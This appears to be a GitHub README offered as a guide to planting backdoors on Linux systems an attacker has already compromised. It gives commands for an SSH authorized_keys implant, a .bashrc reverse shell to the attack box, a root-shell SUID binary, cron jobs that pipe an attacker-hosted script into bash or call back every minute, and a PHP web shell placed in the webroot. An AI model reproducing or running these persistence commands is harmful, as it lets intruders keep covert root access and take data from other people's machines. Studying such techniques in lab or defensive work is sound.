# backdoors

1.ssh\
2.bashrc\
3.suid\
4.cron\
5.php

# //------------------------------------
# 1. SSH Key Access
SSH keys provide extreme convenience for system administrators, however, they also provide convenient backdoors for attackers. Start on your host by generating an SSH key with the command:
\
ssh-keygen\
\
![image](https://raw.githubusercontent.com/DDNvR/backdoors/main/images/sshkeygen.png)
\
This should generate two files an id_rsa.pub which is your public key, and id_rsa which is your private key.\
\
Now that the keys are generated switch back over to the target box and cd to your user's respective home directory (cd ~). As you can see in the image below there was no .ssh directory or authorized_keys file. This is no issue as you can create them with the commands:\
\
mkdir .ssh\
touch authorized_keys

![image](https://github.com/DDNvR/backdoors/blob/main/images/authorizedkeys.png)

\
With that taken care of, back on your attacker box, cat you id_rsa.pub (the public key and copy the entire output.

![image](https://github.com/DDNvR/backdoors/blob/main/images/keyshow.png)

\
All that is left to do is to echo the output of your id_rsa.pub into the authorized_keys file on the target box. I always like to double-check key was formatted properly by taking a look at the authorized_keys file. Alternatively to echoing the contents of your public key to the authorized_keys file, if you have ssh access to the target box you can utilize the text editor of your choice and copy + paste the contents.

![image](https://github.com/DDNvR/backdoors/blob/main/images/addkey.png)

\
Now to utilize the backdoor all you have to do is ssh to the target box and no matter what they change their password to you will always have key access to the host.\
\
Note: make sure to use -i [private key file] in your ssh command to specify you want to make use of key authentication.

# //------------------------------------
# Bashrc Backdoor
The .bashrc file, located in every user's home directory is rarely checked by the average user, making this one of my favorite spots to stick a backdoor.\
\
Ensure you are in your user’s home directory by issuing the command:\
\
cd ~\
\
Now that you are in their home directory simply echo the following and direct the output to append(not overwrite the .bashrc file):\
\
echo ‘bash -i >& /dev/tcp/[attack box ip address]/[port] 0>&1’ >> ~/.bashrc\
\
Confirm the aforementioned command completed successfully my examining the end of the .bashrc file with:\
\
tail ~/.bashrc\
\
With that established, all that is left to do is set up a listener. Now every time that user logs in to the box it will call out to your attack box on the specified port number! To simulate this in a lab environment simply exit the ssh session and re-login with the key persistence we set up earlier. This login will trigger the reverse shell to call out.

![image](https://github.com/DDNvR/backdoors/blob/main/images/bashrc.png)

# //------------------------------------
# SUID Backdoor
SUID binaries are a popular method to privilege escalate on a Linux system. For our final backdoor method, we are going to create our own that drops us into a root shell from a normal user. This method combined with a web shell can be a devastating combo, as you can go from a web shell to the root user in a matter of minutes.\
\
Note: This can be compiled on the target box provided it has gcc installed. In the case it does not (like in my example) I simply compiled it on my attack box and transferred the final product over to the target.\
\
Start by creating a C file with the following command\
\
echo ‘int main() { setresuid(0,0,0,); system(“/bin/sh”); }’ > privshell.c\
\
Compile this new C file to a system binary with:\
\
gcc -o privshell privshell.c\
\
Remove the original C file as seen in the image, and change the ownership of the file (if you created it as the root user it will already be owned by root, however it does not hurt to double-check).\
\
chown root:root privshell\
\
Add the SUID permissions to the file with:\
\
chmod u+s privshell\
\
Finally copy the file to a spot a normal user can access like /tmp or /var/tmp, and switch to a normal user.\

![image](https://github.com/DDNvR/backdoors/blob/main/images/suidbackdoor.png)

\
All that is left to do is execute the new malicious SUID binary and gain root privileges without ever authenticating with a password!\

![image](https://github.com/DDNvR/backdoors/blob/main/images/suidbackdoor2.png)

\
We covered a lot of ground today, thus I recommend finding two Linux virtual machines to practice these on. In the process of making this guide, I stumbled upon a lot of excellent resources if you would like to read further into the subject, happy hacking.

# //------------------------------------
# Cron Backdoor
Cron jobs are often overlooked by daily users, thus making them a great place for us to maintain our access. I will cover two different cron job back door methods leaving it up to you to decide which you prefer.\
\
The first involves creating a bash script with this command\
\
#!/bin/bash\
\
bash -i >& /dev/tcp/[ip address]/[port] 0>&1\
\
Secondly, in the same directory as your newly created bash script start a python3 web server with the command:\
\
python3 -m http.server\
\
Finally set up your netcat listener on the same port specified in your script\
\
nc -nlvp [port #]\
\
imagehere\
\
Now with all that set up and ready to go switch back over to the target box and edit your user’s crontab with the following command:\
\
crontab -e\
\
Add the following two lines to their crontab:\
\
#* * * * * shell ‘curl http://[attack box ip]/[file-name.sh] | bash’\
#* * * * * /bin/bash -c ‘/bin/bash -i >& /dev/tcp/[attack box ip]/[port] 0>&1’\
\
The first will request your hosted bash script and download it to the attack box. Then it will execute the script due to the “| bash” specification in the command.\
\
The second requires no script, or webserver to operate it simply calls back to your attack box with a reverse shell every minute.\

# //------------------------------------
# PHP Backdoor
imagehere\

Many Linux systems have apache running and hosting some form of a web application. Even if it is not running you have the option to start it (root required) with the command\
\
systemctl start apache2\
\
Whether it was already started, or you manually brought the service up you have the options of taking a web shell and sticking it in the webroot directory which is located at:\
\
/var/www/html\
\
I have included links to some of my favorite web shells, but feel free to use your own.\
\
The method you take to transfer the web shell to the target is entirely up to you, however, if you would like to see some potential options make sure to check out this guide on file transfers.\
\
Once the web shell is on target all you have to do is navigate to:\
\
http://[target ip]/webshell.php

imagehere\

Note: The above example is only an example and is entirely dependent on what you name the web shell (it would be a good idea to not call it webshell.php in case there was any confusion).\
\
Make sure to stop the apache2 service and remove the web shell if you practiced on your attack box unless you want to give your entire home network access to your host!

imagehere\

# //------------------------------------
